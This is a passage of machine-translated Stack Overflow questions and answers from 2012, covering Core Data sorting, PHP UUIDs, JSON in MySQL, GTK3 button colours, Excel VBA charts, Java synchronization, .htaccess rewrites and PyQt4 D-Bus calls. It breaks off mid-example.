我正在尝试为核心数据获取请求创建一个排序描述符，它将获取按计算值排序的对象（例如，两个或多个属性的总和）。这可能吗？提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T04:05:53.693

来自“核心数据编程指南”：

> 您不能使用基于瞬态属性的谓词进行获取（尽管您可以使用瞬态属性自己在内存中进行过滤）。...总而言之，如果您直接执行 fetch，则通常不应将基于 Objective-C 的谓词或排序描述符添加到 fetch 请求中。相反，您应该将这些应用于获取的结果。

因此，按计算值排序似乎是不可能的。您必须预先计算排序值并将其作为（非瞬态）属性存储在您的对象中。

# php - PHP从MS sql读取二进制UID值作为十六进制

> ID：11927767
> 
> 赞同：1
> 
> 时间：2012-08-13T03:11:40.853
> 
> 标签：php, hex, uid

我有一个生成 UID 的代码：

```
 $time_low = str_pad(dechex(mt_rand(0, 65535)), 4, '0', STR_PAD_LEFT) . str_pad(dechex(mt_rand(0, 65535)), 4, '0', STR_PAD_LEFT);
        $time_mid = str_pad(dechex(mt_rand(0, 65535)), 4, '0', STR_PAD_LEFT);

        $time_high_and_version = mt_rand(0, 255);
        $time_high_and_version = $time_high_and_version & hexdec('0f');
        $time_high_and_version = $time_high_and_version ^ hexdec('40');  // Sets the version number to 4 in the high byte
        $time_high_and_version = str_pad(dechex($time_high_and_version), 2, '0', STR_PAD_LEFT);

        $clock_seq_hi_and_reserved = mt_rand(0, 255);
        $clock_seq_hi_and_reserved = $clock_seq_hi_and_reserved & hexdec('3f');
        $clock_seq_hi_and_reserved = $clock_seq_hi_and_reserved ^ hexdec('80');  // Sets the variant for this GUID type to '10x'
        $clock_seq_hi_and_reserved = str_pad(dechex($clock_seq_hi_and_reserved), 2, '0', STR_PAD_LEFT);

        $clock_seq_low = str_pad(dechex(mt_rand(0, 65535)), 4, '0', STR_PAD_LEFT);
        $node = str_pad(dechex(mt_rand(0, 65535)), 4, '0', STR_PAD_LEFT) . str_pad(dechex(mt_rand(0, 65535)), 4, '0', STR_PAD_LEFT) . str_pad(dechex(mt_rand(0, 65535)), 4, '0', STR_PAD_LEFT);
        $guid = $time_low . '-' . $time_mid . '-' . $time_high_and_version . $clock_seq_hi_and_reserved . '-' . $clock_seq_low . '-' . $node; 
```

它生成一个字符串，如：**011FFF33-CA4A-44E8-8CD5-7344D8E94344**。当我从 MS SQL 2008 数据库中读取它时，我得到如下二进制字符串：**3ÿJÊèDŒÕsDØéCD**。如何将其读取为十六进制字符串而不是二进制字符串？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T12:35:39.463

在 select 调用中将其转换为字符串 - uid 存储在原始位中，而不是您看到的漂亮的十六进制字符串。mssql 驱动程序可能会将这些原始位传回，并且本身不会转换为可读的十六进制字符串，因此请在查询中执行此操作。

# php - 可以将 JSON 数组数据存储在 MySQL 数据库中吗？

> ID：11927769
> 
> 赞同：4
> 
> 时间：2012-08-13T03:11:46.480
> 
> 标签：php, mysql, database, database-design

我有一个独特的情况。我网站的用户可以提交文章供其他用户审阅，但他们可以按年龄和国家/地区限制谁可以审阅文章。我的问题是，我认为将所有 250 个国家（或他们希望其他用户可见的任何国家）以 JSON 格式存储在数据库。这样我每篇文章只需要一条记录。我不确定性能是否会受到严重影响？该网站将处理 1-2 百万用户，提交审查的文章数量也将相当大。唯一要做的“处理”是每个用户

你们有什么感想？我是否过度认为每篇文章的 250 条记录很多？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T03:34:29.823

我认为将数据存储在查找表中是完全可以接受的。如果将来发生变化，它会为您提供更多的自由，并且只要您很好地索引表，性能就不会受到太大影响。

Mysql 可以轻松处理数十亿条记录的数据。是的，您需要确保您的数据完整性 - 但是向查找表添加一列与更改存储在每条记录中的对象相比突然变得容易得多。

只需确保您正确保存数据 - 因为您没有重复不必重复的信息。将国家/地区保存在一个表中，并在引用它的查找表中保存一个简单的 ID。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T03:22:15.687

简而言之，如果您不打算基于该列查询数据，那么将 Json 数据存储在关系数据库的列中是可以的。

如果您需要根据该列查找数据，那么在排除数据之前必须解析 json 会对性能造成巨大影响，因此这将是一个不可以。

我们在我的工作中以较小的规模遇到了这个问题，并且在数据库中存储属性的 json 效果很好，不会增加非搜索属性的数据库的复杂性。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T03:32:31.800

我会使用另一个表来代替该数据，并创建一个唯一的列来匹配它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-13T03:32:42.160

您有一个“国家”表和一个“文章”表。我会制作第三个“国家文章”，只包含应该匹配的索引。毕竟Mysql是关系型的。如果您担心性能，请进行基准测试。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T03:23:29.647

一种选择可能是使用位域来表示您的国家/地区，使用 MySQL[位](http://dev.mysql.com/doc/refman/5.0/en/bit-type.html)或[二进制](http://dev.mysql.com/doc/refman/5.0/en/binary-varbinary.html)类型。这将允许您将每个国家/地区的信息存储在一个位中，最终每条记录只需要 32 个额外字节（8 位/字节 * 32 字节 = 256 位）。

我不确定，但甚至可以使用按位运算进行查询，这可能非常快。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-13T03:47:12.710

您可以为国家/地区创建一个单独的表，并将其 ID 与文章表一起存储。

您可以将所有国家/地区、亚洲、欧洲、北美、南美等的选项存储在您的国家/地区表中。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-13T09:20:39.677

JSON 将阻止 DBMS 检查您希望存储的国家/地区的有效性。它基本上是一个不透明的文本，因此 DBMS 不能强制引用完整性（外键）。

即使您不需要查询国家/地区（这是一个相当大的 if），您至少需要在检查特定国家/地区之前解析 JSON。

JSON 可以很好地匹配分层数据，但这只是一个简单的集合（国家或者不是集合的元素），可以通过单独的连接表 ARTICLE_COUNTRY 很好地表示，然后可以有效地维护和搜索：

![在此处输入图像描述](../Images/1237e517e1beecc2237061262e87d20e.png)

此联结表将仅链接到可访问文章的国家/地区。如果大多数文章都可以从大多数国家/地区访问，您甚至可以**反转**联结表的含义并仅存储“禁止”国家/地区，从而降低总行数。

# jsf - 如何在不通过 jsf 中的确认浏览器对话框的情况下自动保存从浏览器下载的文件？

> ID：11927782
> 
> 赞同：1
> 
> 时间：2012-08-13T03:15:05.523
> 
> 标签：jsf, jakarta-ee, browser, richfaces, webbrowser-control

我有一个`jsf`单元测试来测试下载文件是否成功，但问题是当点击下载按钮时我被阻止，因为我无法将我的代码从我正在使用的浏览器中引用到下载对话框。我无法`OK`从我的代码中单击按钮，我已经尝试过`jQuery`一段时间的代码，但回车键不会触发`OK`对话框的按钮。

有没有办法引用浏览器的下载对话框，我想在 bean 中进行。谢谢。

# c# - 使用 WebBrowser 控件加载自定义 DLL

> ID：11927784
> 
> 赞同：2
> 
> 时间：2012-08-13T03:15:12.720
> 
> 标签：c#, .net, visual-studio-2010, webbrowser-control

尝试使用 WebBrowser 控件“无头”截取网页截图。我意识到这可能不是最好的做法，但长话短说，我们公司使用 IE，我们只能使用 IE 来查看某些基于浏览器的应用程序。我相信应用程序会加载某些仅在 IE 中工作的 DLL/ActiveX 控件。所以我试图在 WebBrowser 控件中加载使用这些 ActiveX 控件的页面，拍摄屏幕截图，然后在用户喜欢使用的任何浏览器中返回图像。

这种方法适用于“www.google.com”（因为它不加载任何自定义 DLL），但不适用于我们基于 Web 的应用程序 - 我遇到了崩溃：

> 程序“[4516] WebDev.WebServer40.EXE: Managed (v4.0.30319)”已退出，代码为 -1073741819 (0xc0000005)。

故障模块名称是 Web 应用程序需要的特定 DLL。所以问题是，我如何确保所需的 DLL 与 WebBrowser 控件一起加载，就像我打开 IE 时一样？也许这是一个权限问题？

# button - 如何在 Python GTK3 中制作不同颜色的按钮（使用 gi）？

> ID：11927785
> 
> 赞同：5
> 
> 时间：2012-08-13T03:15:18.320
> 
> 标签：button, colors, python-3.x, gtk3

我最新的令人头疼的事情是使用 GTK3 在 Python3 中构建一个愚蠢的小应用程序，按钮上的颜色不是雾灰色。在过去的几天里，我一直在谷歌上搜索如何做到这一点，到目前为止，我所尝试的一切都失败了。不仅失败了，而且*默默地*失败了，没有错误消息可以让我知道发生了什么。

这是我的测试应用程序：

```
from gi.repository import Gtk, Gdk

class ButtonWindow(Gtk.Window):

    def __init__(self):
        super().__init__(title="Button Test")
        self.set_border_width(10)
        hbox = Gtk.Box(spacing=10)
        self.add(hbox)
        hbox.set_homogeneous(False)

        # make the button
        button = Gtk.Button('Test Button')
        hbox.pack_start(button, True, True, 0)

        # try to change its colour ....

#        button.modify_base(Gtk.StateType.NORMAL, Gdk.color_parse('green'))
#        button.override_background_color(Gtk.StateType.NORMAL, Gdk.RGBA(0, 1, 0, 1))
#        button.override_background_color(Gtk.StateType.NORMAL, Gdk.RGBA(0x00ff00))
#        button.modify_bg(Gtk.StateType.NORMAL, Gdk.color_parse("green"))
#        button.modify_bg(Gtk.StateType.ACTIVE, Gdk.color_parse("green"))
#        button.modify_bg(Gtk.StateType.SELECTED, Gdk.color_parse("green"))

        # attempt to change the style ....

#        style = button.get_style().copy()
#        style.bg[Gtk.StateType.NORMAL] = Gdk.color_parse('green')
#        style.bg[Gtk.StateType.ACTIVE] = Gdk.color_parse('red')
#        style.bg[Gtk.StateType.SELECTED] = Gdk.color_parse('blue')
#        style.bg[Gtk.StateType.PRELIGHT] = Gdk.color_parse('black')
#        button.set_style(style)

        # ok, let's try changing the box ....

#        hbox.modify_base(Gtk.StateType.NORMAL, Gdk.color_parse('green'))
#        hbox.override_background_color(Gtk.StateType.NORMAL, Gdk.RGBA(0,1,0,1))
#        hbox.override_background_color(Gtk.StateType.NORMAL, Gdk.RGBA(0x00ff00ff))
#        hbox.modify_bg(Gtk.StateType.NORMAL, Gdk.color_parse('green'))

window = ButtonWindow()        
window.connect("delete-event", Gtk.main_quit)
window.show_all()
Gtk.main() 
```

我已将我失败的尝试作为评论留下。如上所述，就应用程序而言，它似乎已经工作，因为上述变体都不会生成任何错误消息。但是，它们似乎*都不适合我，因为按钮仍然是陈旧的洗碗水的颜色。*

仅供参考，我在 Ubuntu 12.04 下使用 Python 3.2.3，并从标准存储库安装了 python3-gi 和 python3-gi-cairo。

有人可以指出我正确的方向吗？

编辑：以下是根据@mike 的回答重新设计的示例。这可行，但它存在一些问题，可能需要在一些后续问题中解决。问题是：

1.  为什么`background`必须在 Ubuntu 上使用而不是`background-color`，然后只用于按钮？
2.  我仍然在让字体样式正常工作时遇到一些问题，但至少现在我有一个可以使用的示例。
3.  可以将不同的样式/颜色应用于不同的按钮，例如基于文本或其他属性吗？

所以，代码： -

```
from gi.repository import Gtk, Gdk

class ButtonWindow(Gtk.Window):

    def __init__(self):
        super().__init__(title="Button Test")
        self.set_border_width(10)

        hbox = Gtk.Box(spacing=10)
        self.add(hbox)
        hbox.set_homogeneous(False)

        # make the button
        button = Gtk.Button('Test Button')
        hbox.pack_start(button, True, True, 0)

# get the style from the css file and apply it
cssProvider = Gtk.CssProvider()
cssProvider.load_from_path('gtkStyledButtonTest.css')
screen = Gdk.Screen.get_default()
styleContext = Gtk.StyleContext()
styleContext.add_provider_for_screen(screen, cssProvider,
                                     Gtk.STYLE_PROVIDER_PRIORITY_USER)

window = ButtonWindow()        
window.connect("delete-event", Gtk.main_quit)
window.show_all()
Gtk.main() 
```

css 文件看起来像这样：-

```
GtkWindow {
    background-color: #0000ff;
}

GtkButton {
    color: #ff0000;
    background: #00ff00;
} 
```

我希望有人觉得这很有用。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-16T00:25:00.587

尽管这是一个老问题，但我想添加一个针对问题 3 的答案，仅供参考。

GTK3 增加了样式类的概念。因此，要获得不同颜色的按钮，您可以直接将它们命名为名称或将样式类添加到其上下文中。所有这些都在他的答案中提供的链接中进行了解释。

这是一个简单的示例，如何使用样式类突出显示条目中的无效文本：

```
from gi.repository import Gtk, Gdk

class MainWindow(Gtk.Window):

    def __init__(self):
        super().__init__()
        vbox = Gtk.Box(spacing=10,orientation=Gtk.Orientation.VERTICAL)
        self.add(vbox)

        self.entries = [ Gtk.Entry() for i in range(3) ]
        for e in self.entries:
            vbox.pack_start(e, True, True, 0)
            e.connect("changed", self.on_entry_changed)
            e.set_text('123')

        button=Gtk.Button('ok',name='ok-button')
        vbox.pack_end(button,True,True,0)

    def on_entry_changed(self,entry):
        ctx = entry.get_style_context()
        if not entry.get_text().isnumeric():
            ctx.add_class('invalid')
        else:
            ctx.remove_class('invalid')

cssProvider = Gtk.CssProvider()
cssProvider.load_from_path('style.css')
screen = Gdk.Screen.get_default()
styleContext = Gtk.StyleContext()
styleContext.add_provider_for_screen(screen, cssProvider,
                                     Gtk.STYLE_PROVIDER_PRIORITY_USER)

window = MainWindow()
window.connect("delete-event", Gtk.main_quit)
window.show_all()
Gtk.main() 
```

使用 style.css：

```
GtkEntry.invalid {
    background-color: #ffaaaa;
    background: #ffaaaa;
}

GtkButton#ok-button {
    background-color: green;
    background: green;
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-28T01:44:43.777

GTK3 中的首选方式是使用 CSS 进行样式设置。在 Ubuntu 12.04 下，您可能需要使用背景而不是背景颜色。但是我不懂Python，所以我只提供一个链接。

[https://thegnomejournal.wordpress.com/2011/03/15/styling-gtk-with-css/](https://thegnomejournal.wordpress.com/2011/03/15/styling-gtk-with-css/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-21T01:03:12.480

受@boosth 的启发，这是修改后的代码（包装按钮，并将颜色应用于包装器 - 参见注释为 的行`# <----`）。

然而，虽然它改变了事件框的颜色，但按钮本身保持不变。所以，这不是我想要的，但到目前为止这是最好的答案。

```
from gi.repository import Gtk, Gdk

class ButtonWindow(Gtk.Window):

    def __init__(self):
        super().__init__(title="Button Test")
        self.set_border_width(10)

        hbox = Gtk.Box(spacing=10)
        self.add(hbox)
        hbox.set_homogeneous(False)

        # make the button
        button = Gtk.Button('Test Button')
        buttonWrapper = Gtk.EventBox()                  # <----
        buttonWrapper.add(button)                       # <----
        hbox.pack_start(buttonWrapper, True, True, 0)   # <----

        # change the colour of the wrapper ....
        buttonWrapper.modify_bg(Gtk.StateType.NORMAL, Gdk.color_parse("green"))
        buttonWrapper.modify_bg(Gtk.StateType.ACTIVE, Gdk.color_parse("red"))
        buttonWrapper.modify_bg(Gtk.StateType.SELECTED, Gdk.color_parse("blue"))

window = ButtonWindow()        
window.connect("delete-event", Gtk.main_quit)
window.show_all()
Gtk.main() 
```

必须有办法做到这一点......

# vba - 以编程方式更改边界线时 Excel 2007 图表未更新

> ID：11927788
> 
> 赞同：1
> 
> 时间：2012-08-13T03:15:51.523
> 
> 标签：vba, excel, charts, lines

我很确定这是一个错误，但也许我遗漏了一些东西。

所以我想要一个曲面图（所有线条都可见）：

（*编辑：好的，我试图发布一张图片，但这个东西不允许我发布，因为它是一个新帐户......但你明白了*）

为此，我创建了我的数据表，然后*应该*运行以下代码：

```
Sub test()
    Charts.Add
    ActiveChart.charttype = xlSurface
    test2
End Sub
Sub test2()
Dim a
    For Each a In ActiveChart.Legend.LegendEntries
        a.LegendKey.Format.Line.Visible = msoTrue
        a.LegendKey.Format.Line.ForeColor.RGB = RGB(0, 0, 0)
        ActiveChart.Refresh
    Next a
End Sub 
```

如果我运行`test()`，我会得到图表但没有线条（这是 excel 默认值）。如果我`test2`再次重新运行，则行会填满。当然，这完全没有意义。

我绝不是这方面的新手（我已经帮助回答了我个人帐户中的一些问题，但在工作中无法访问该帐户）。我也尝试过`DoEvents`，`ActiveChart.Refresh`但没有骰子。我也很确定它在 excel 2010 中可以正常工作（这是我第一次在家尝试的地方），所以这似乎是 2007 年的一个错误。错误与否我必须在 2007 年工作，所以我正在寻找解决方案。请问有人吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T05:23:50.460

很抱歉花了这么长时间才回复，但我试图在我的虚拟机上安装 Excel 2007，但似乎我的虚拟机给我带来了麻烦，所以我没有在 Excel 2007 中测试过这段代码，但我相信它应该可以工作。

这就是为什么我总是建议不要使用“Active-Something”的原因。不管`ActiveCell`是，`ActiveSheet`等等`Activeworkbook`。总是声明你的变量，然后使用变量。你永远不会出错。看这个例子

```
Sub test()
    Dim objChrt As ChartObject

    Set objChrt = ActiveSheet.ChartObjects.Add _
    (Left:=50, Width:=200, Top:=50, Height:=200)

    With objChrt
        .Chart.SetSourceData Source:=Sheets("Sheet1").Range("A1:C5")
        .Chart.ChartType = xlSurface
        test2 .Chart
    End With
End Sub

Sub test2(chrt As Chart)
    Dim a
    For Each a In chrt.Legend.LegendEntries
        a.LegendKey.Format.Line.Visible = msoTrue
        a.LegendKey.Format.Line.ForeColor.RGB = RGB(0, 0, 0)
        chrt.Refresh
    Next a
End Sub 
```

# php - 如何在 php symfony2 的 DateTime 字段中添加年份

> ID：11927789
> 
> 赞同：2
> 
> 时间：2012-08-13T03:15:51.307
> 
> 标签：php, symfony, doctrine-orm

我有这个作为到期日

`$expiryDate = new DateTime();`

但这会将到期日期推迟到今天。我怎么能在那段时间加5年

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-13T03:19:49.970

检查[日期时间::修改](http://www.php.net/manual/en/datetime.modify.php)

```
$expiryDate->modify('+5 year'); 
```

或者

```
$expiryDate = new DateTime('+5 year'); 
```

# java - Java - 同步方法/块

> ID：11927790
> 
> 赞同：0
> 
> 时间：2012-08-13T03:15:54.170
> 
> 标签：java, multithreading, static, synchronized

如果我正在使用`synchronized`，那么正在同步的对象是否必须是`static`？

编辑：我的意思是说对对象的引用必须是静态的。我注意到我正在阅读的一个示例表明，为了让线程在 A 类中使用同步方法，那么对 A 类的引用必须是静态的。

所以，我想知道将对象的引用设为静态是否是一种规则，以便所有调用同步方法的线程都使用相同的实例副本。在我的示例中，同步方法用于从 1 计数到 10。因此，访问此同步方法的每个线程都应该从 1 计数到 10。我在没有静态的情况下尝试过，结果不正确。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T04:19:30.230

对象不能是静态或非静态的：此属性仅适用于变量。所有对象都平等地生活在堆上，直到不再通过“根”的引用*到达它们。*

对于同步，我们需要对象本身（而不是保存引用的变量），因此如果对这些对象的引用由静态、非静态或局部变量保存，则没有区别。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T04:22:32.993

它**不是** **static 或 non-static**`object`，**而是其状态受到保护免受并发问题影响**的数据。

 ******1.** `synchronized`是一个关键字，当**2 个或多个线程访问同一个对象时使用。**

**2.**同步是关于保护**关键数据的状态。**

**3.**每个`object`都有一个`Lock and a Key`，所以为了保护**一个** `instance variable`，一个`object's key`被使用的数据。

**4.**类似地，为了保护`State of the Data`which is `static`，即（类数据），`class's key`被使用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T05:42:43.983

冒着过分轻视这一点的风险：

1.  **检查代码并确定*资源集，或*将由将在并发线程上运行的代码访问的数据。** 要考虑的代码可能跨越多个方法，可能是类。

2.  **一般来说，同步代表一*组资源*的东西：**

    *   **如果*资源集*都是对象实例数据（非静态），那么在拥有数据的对象上进行同步是可以接受的。** （如果那个对象不是“this”，那就问自己很多问题吧！）。

    *   ***如果资源集的*任何部分是静态类数据，那么您必须在代表静态数据的东西上进行同步。**这可能是它`class`本身。（也知道原始值不是对象）。

    *   ***对于任何给定的资源集，*始终锁定相同的东西。** 这确保了竞争同一*组资源*的线程彼此正确协调。

3.  **如果您正在考虑两组这样*的资源*，则不得有*任何一项*属于两组。** 如果是这样的话，它们必须成为一个单一*的资源集*。

4.  如果您在同一对象中的方法不竞争（读取或写入）来自(1) 中标识*的资源集中的**任何内容，则该方法**可能*不需要同步。但是，如果该方法将同时使用，那么请考虑：

     ***   如果这样的方法确实从另一*组资源*访问数据，那么它需要同步到该组。

    *   见（3）。** 

 **[阅读本文以了解`sychronized`关键字如何用于静态方法和实例方法](https://stackoverflow.com/questions/437620/java-synchronized-methods-lock-on-object-or-class)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T03:22:58.630

不必要。

如果您正在构建一个 Web 应用程序（例如）并且每个客户端会话都在处理特定于会话的对象列表（例如，每个用户的书籍列表），那么您的线程可以阅读您的书籍列表同时我的线程正在更新我的书单。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T04:54:39.397

我们不同步对象。我们同步一个代码块（可以是一个方法或`synchronized`块内的代码），这样一次只有一个线程可以通过该块。Object 提供了锁，如果一个线程已经在该代码块中运行，该锁用于防止其他线程进入该代码块。对对象的引用是否`static`与线程同步无关，但还要注意，您不能在静态方法中使用非静态变量。******

# .htaccess - .htaccess 使我的 URL 结尾处没有斜线“未找到”

> ID：11927799
> 
> 赞同：1
> 
> 时间：2012-08-13T03:17:23.543
> 
> 标签：.htaccess, url, url-rewriting

```
#RewriteEngine On

#RewriteCond %{REQUEST_FILENAME} !-d 
#RewriteCond %{REQUEST_FILENAME}\.php -f 
#RewriteRule ^(.*)$ $1.php

RewriteEngine On
RewriteBase /

# Use the following rule if you want to make the page like a directory
RewriteRule ^user/(!(profile.php))$ user/$1/ [R=301,L]

# The following rule does the rewrite.
RewriteRule ^user/(.+)/$ profile.php?id=$1

# The following rewrite the other way round:
RewriteCond %{REQUEST_URI} ^/profile.php
RewriteCond %{THE_REQUEST} ^(GET|POST|HEAD|TRACE)\ /profile.php
RewriteCond %{QUERY_STRING} id=([^&]+)
RewriteRule ^profile.php$ user/%1?

<files .htaccess>
order allow,deny
deny from all
</files>

RewriteCond %{HTTP_HOST} ^www\.mysite\.com$
RewriteRule ^(.*)$ "http\:\/\/mysite\.com\/$1" [R=301,L] 
```

当我访问此 URL 时：http: [//mysite.com/user/john/](http://mysite.com/user/john/) - 这完全可以正常工作！但是当我在最后没有斜杠的情况下访问 URL 时，如下所示：[http://mysite.com/user/john](http://mysite.com/user/john)浏览器告诉我这个错误：

![在此处输入图像描述](../Images/ed34a6e108a9956c6456cca5a55c1d4c.png)

我应该在这里做什么？您的帮助将不胜感激和奖励！

谢谢！:-)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T03:22:43.133

你的规则在这里：

```
RewriteRule ^user/(!(profile.php))$ user/$1/ [R=301,L] 
```

似乎不适合我。尝试将其更改为：

```
RewriteCond %{REQUEST_URI} !^/user/profile.php
RewriteRule ^user/(.*[^/])$ user/$1/ [R=301,L] 
```

由于您的原始规则不匹配，因此请求`http://mysite.com/user/john`会通过未更改的规则，因此不会由 profile.php 处理。

# cocoa - 使用脚本桥创建邮件

> ID：11927800
> 
> 赞同：0
> 
> 时间：2012-08-13T03:17:25.183
> 
> 标签：cocoa, email, scripting-bridge

我正在尝试使用可可脚本桥创建一个新的电子邮件，但似乎无法让它工作。我到目前为止：

```
MailApplication *mail = [SBApplication applicationWithBundleIdentifier:@"com.apple.Mail"];
MailOutgoingMessage *emailMessage = [[[[mail classForScriptingClass:@"outgoing message"]     alloc] initWithProperties:[NSDictionary dictionaryWithObjectsAndKeys: [saveFileName substringToIndex:[saveFileName length]-4], @"subject", @"something about app.", @"content", nil]] autorelease];
// add the object to the mail app 
[[mail outgoingMessages] addObject: emailMessage];
emailMessage.visible = YES;

if ( [FileFullName length] > 0 ) {

    MailAttachment *theAttachment = 
    [[[mail classForScriptingClass:@"attachment"] alloc]
     initWithProperties:[NSDictionary dictionaryWithObjectsAndKeys:
                         FileFullName, @"fileName",nil]];
    // add it to the list of attachments 
    [[emailMessage.content attachments] addObject: theAttachment];
    [theAttachment release];
} 
```

当我尝试设置可见属性时，我收到错误消息：

```
-[SBProxyByClass setVisible:]: object has not been added to a container yet; selector not recognized [self = 0x7fd4fae3cc90] 
```

当我为 app. 添加沙箱时出现此问题。谁能指出正确的方向？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-30T06:18:14.493

如果您的代码在您启用沙箱之前可以运行，那么您应该在发送邮件之前先执行此操作。将以下代码添加到您的 Entitlements.plist。

```
 <key>com.apple.security.temporary-exception.apple-events</key>
    <array>
    <string>com.apple.mail</string>
    </array> 
```

# java - 向导型图像处理应用程序的架构

> ID：11927804
> 
> 赞同：0
> 
> 时间：2012-08-13T03:19:23.890
> 
> 标签：java, image-processing, architecture, layer

我们正在构建一个向导式的图像处理软件。它由三层组成：GUI、引擎和 Core_Algorithms。

**向导：**应用程序的每个“面板”都要求用户做某事。示例：第一个面板要求用户加载一些图像，下一个面板应用“种子区域增长”（SRG）算法并要求用户使用“魔术棒工具”调整结果。

**幕后发生的事情：**所有算法都保存在“核心”包中（并且完全独立于 GUI）。所有数据项（对于整个应用程序）都存储在单个类（**Data.java**）中。

**数据.java**

```
/*Stores ALL the necessary data items*/
public class Data{

    BufferedImage sourceImage, targetImage;
    BufferedImage srcGrownImg;
    Point srcPoint, tarPoint;//and many more data items for each algorithm and panel
} 
```

另一个类（从**Data.java**扩展而来的 Engine.java）使用这些数据项，运行适当的算法（如“core”包中的 SRG.java）并存储这些项（在 Data.java 中）。向导的每个阶段都有相同的“Engine.java”实例，以便他们可以设置、运行算法并获取结果。

**引擎.java**

```
/*Runs algorithms inside "core"*/
public class Engine extends Data{
    public growSource()
    {
        SRG srgObj = new SRG(srcImg, srcSeeds);
        srcGrownImg = srgObj.runAndGetResult();
    }//and many more functions for each panel
} 
```

**问题：**我们遇到的问题是“Data.java”和“Engine.java”太长了。Engine.java 由短而甜的函数组成（3-4 行）（但整个向导使用的所有函数都存储在其中，因此它非常长）。

**问题：**我想要关于如何分解代码的建议，以便“Data.java”和“Engine.java”变得更短。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T04:20:47.260

您可能能够应用[*适配器模式*](http://en.wikipedia.org/wiki/Adapter_pattern)来调用通用接口的不同实现，例如`runAndGetResult()`. 结果是有尽可能多的具体实现，因为有多种方法可以实现`runAndGetResult()`。

此[示例](https://sites.google.com/site/drjohnbmatthews/enumerated-functions)说明了单个抽象函数的模式`eval()`，但可以实现多个接口。类[文字](http://docs.oracle.com/javase/tutorial/extra/generics/literals.html)用作运行时类型标记以按名称获取实现，但也可以使用注册表。

在 GUI 中，适配器可能会扩展[`AbstractAction`](http://docs.oracle.com/javase/tutorial/uiswing/misc/action.html)用于按钮、菜单项和其他接受`Action`. 对于离线处理，可以在 GUI 中组成适配器列表，然后在另一个线程中按照规定的顺序进行评估。

# pyqt4 - 在 PyQt4 中处理 QDBusPendingCallWatcher 结果？

> ID：11927811
> 
> 赞同：0
> 
> 时间：2012-08-13T03:20:21.970
> 
> 标签：pyqt4, dbus, qtdbus

我想使用 PyQt4.QtDBus 对远程 D-Bus 服务中的函数进行非阻塞调用。改编自 Qt 的 C++ 文档，我想出了以下测试程序：

```
from PyQt4 import QtCore, QtDBus

class DeviceInterface(QtDBus.QDBusAbstractInterface):

    def __init__(self, service, path, connection, parent=None):
        super().__init__(service, path, 'org.freedesktop.UDisks.Device',
                         connection, parent)

    @QtCore.pyqtSlot(QtDBus.QDBusArgument)
    def callFinishedSlot(self, arg):
        print("Got result:", arg)

if __name__ == '__main__':
    import sys
    app = QtCore.QCoreApplication(sys.argv)

    dev = DeviceInterface('org.freedesktop.UDisks',
                          '/org/freedesktop/UDisks/devices/sda1',
                          QtDBus.QDBusConnection.systemBus(), app)

    async = dev.asyncCall("FilesystemListOpenFiles");
    watcher = QtDBus.QDBusPendingCallWatcher(async, dev)
    watcher.finished.connect(dev.callFinishedSlot)
    sys.exit(app.exec_()) 
```

它似乎工作。当我运行它时，它会打印：

```
Got result: <PyQt4.QtDBus.QDBusPendingCallWatcher object at 0xb740c77c> 
```

问题是，我不知道如何将 转换为可以从中提取结果的`QDBusPendingCallWatcher`东西（例如）。[C++ 文档](http://qt-project.org/doc/qt-4.8/qdbuspendingcallwatcher.html)`QDBusMessage`中的示例执行此操作：

```
 void MyClass.callFinishedSlot(QDBusPendingCallWatcher *call)
 {
     QDBusPendingReply<QString, QByteArray> reply = *call;
     if (reply.isError()) {
         showError();
     } else {
         QString text = reply.argumentAt<0>();
         QByteArray data = reply.argumentAt<1>();
         showReply(text, data);
     }
     call->deleteLater();
 } 
```

谁能告诉我如何将 C++ 插槽转换为适用于 PyQt4 的东西？（我将 PyQt4.9.1 与 Qt 4.8.1 一起使用。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T15:48:33.283

好的，诀窍似乎是`QDBusPendingReply`从实例构造一个（非常感谢 Phil Thompson 在[PyQt 邮件列表](http://www.riverbankcomputing.com/pipermail/pyqt/2012-August/031820.html)`QDBusPendingCallWatcher`中指出这一点）。事实证明，同样的技术也适用于 C++。我的原始代码中的 UDisk 对象路径错误，加上其他一些小错别字，所以这里有一个完整的工作示例，供后人参考：

```
from PyQt4 import QtCore, QtDBus

class DeviceInterface(QtDBus.QDBusAbstractInterface):

    def __init__(self, service, path, connection, parent=None):
        super().__init__(service, path, 'org.freedesktop.UDisks.Device',
                         connection, parent)

    def callFinishedSlot(self, call):
        # Construct a reply object from the QDBusPendingCallWatcher
        reply = QtDBus.QDBusPendingReply(call)
        if reply.isError():
            print(reply.error().message())
        else:
            print("  PID        UID     COMMAND")
            print("-------    -------   ------------------------------------")
            for pid, uid, cmd in reply.argumentAt(0):
                print("{0:>7d}    {1:>7d}   {2}".format(pid, uid, cmd))
        # Important: Tell Qt we are finished processing this message
        call.deleteLater()

if __name__ == '__main__':
    import sys
    import signal
    signal.signal(signal.SIGINT, signal.SIG_DFL)

    app = QtCore.QCoreApplication(sys.argv)

    dev = DeviceInterface('org.freedesktop.UDisks',
                          '/org/freedesktop/UDisks/devices/sda1',
                          QtDBus.QDBusConnection.systemBus(), app)

    async = dev.asyncCall("FilesystemListOpenFiles");
